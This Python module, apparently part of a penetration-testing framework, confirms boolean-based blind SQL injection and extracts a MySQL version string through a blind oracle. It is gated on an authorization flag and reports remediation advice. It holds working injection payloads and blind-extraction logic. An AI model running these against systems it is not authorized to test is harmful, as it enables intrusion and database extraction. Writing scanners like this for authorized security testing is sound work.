from __future__ import annotations

import re
from typing import Any

from nightfalllx.core.blind import BlindExtractor
from nightfalllx.core.finding import Finding, Severity
from nightfalllx.core.http import HttpClient, Resp
from nightfalllx.core.module import BaseModule, TargetProtocol
from nightfalllx.core.verifier import VulnerabilityVerifier

VERSION_RE = re.compile(r"^\d+\.\d+\.\d+(?:[-+~][A-Za-z0-9.\-]+)?$")


class SQLiModule(BaseModule):
    name = "sqli"
    description = "Boolean-based SQL injection verification with bounded MySQL version fingerprinting"

    def __init__(
        self,
        client: HttpClient,
        *,
        rate_limit: float = 5.0,
        max_version_length: int = 32,
    ):
        self.client = client
        self.rate_limit = rate_limit
        self.max_version_length = max_version_length

    def run(self, target: TargetProtocol) -> list[Finding]:
        if not target.authorized:
            raise PermissionError("SQLiModule requires TargetSpec.authorized=True")

        verifier = VulnerabilityVerifier(self.client, authorized=True)
        findings: list[Finding] = []
        for parameter in target.parameters:
            result = verifier.verify_boolean_sqli(
                target.url,
                parameter,
                params=dict(target.request_params),
                method=target.method,
            )
            if not result.vulnerable:
                continue

            version = self._extract_version(target, parameter, verifier)
            confidence = 100 if VERSION_RE.match(version) else 70
            detail = result.detail
            if version:
                detail += f"; extracted MySQL version={version}"
            else:
                detail += "; boolean injection confirmed, version fingerprint unavailable"

            findings.append(
                Finding(
                    module=self.name,
                    severity=Severity.HIGH,
                    confidence=confidence,
                    url=target.url,
                    title="SQL injection (boolean-based blind)",
                    cwe_id=89,
                    parameter=parameter,
                    payload=f"{parameter}=1 AND 1=1 / 1 AND 1=2",
                    evidence=result.evidence,
                    detail=detail,
                    remediation=(
                        "Use parameterised queries for all request-controlled values. "
                        "Do not concatenate SQL fragments or identifiers."
                    ),
                    references=(
                        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                    ),
                    next_steps=(
                        "Review the query construction for the affected parameter.",
                        "Confirm the database user's privileges under the rules of engagement.",
                    ),
                )
            )
        return findings

    def _extract_version(
        self,
        target: TargetProtocol,
        parameter: str,
        verifier: VulnerabilityVerifier,
    ) -> str:
        params = dict(target.request_params)
        original = params.get(parameter, "1")
        true_params = dict(params)
        true_params[parameter] = f"{original} AND 1=1"
        false_params = dict(params)
        false_params[parameter] = f"{original} AND 1=2"
        true_response = self._send(target, true_params)
        false_response = self._send(target, false_params)
        if true_response.error or false_response.error:
            return ""

        def oracle(condition: str) -> bool:
            query = dict(params)
            query[parameter] = f"{original} AND ({condition})"
            response = self._send(target, query)
            if response.error:
                return False
            return verifier.similarity(
                response.text, true_response.text
            ) > verifier.similarity(response.text, false_response.text)

        extractor = BlindExtractor(
            oracle,
            max_length=self.max_version_length,
            rate_limit=self.rate_limit,
        )
        return extractor.extract_version().value

    def _send(self, target: TargetProtocol, params: dict[str, Any]) -> Resp:
        if target.method == "POST":
            return self.client.post(target.url, data=params)
        return self.client.get(target.url, params=params)
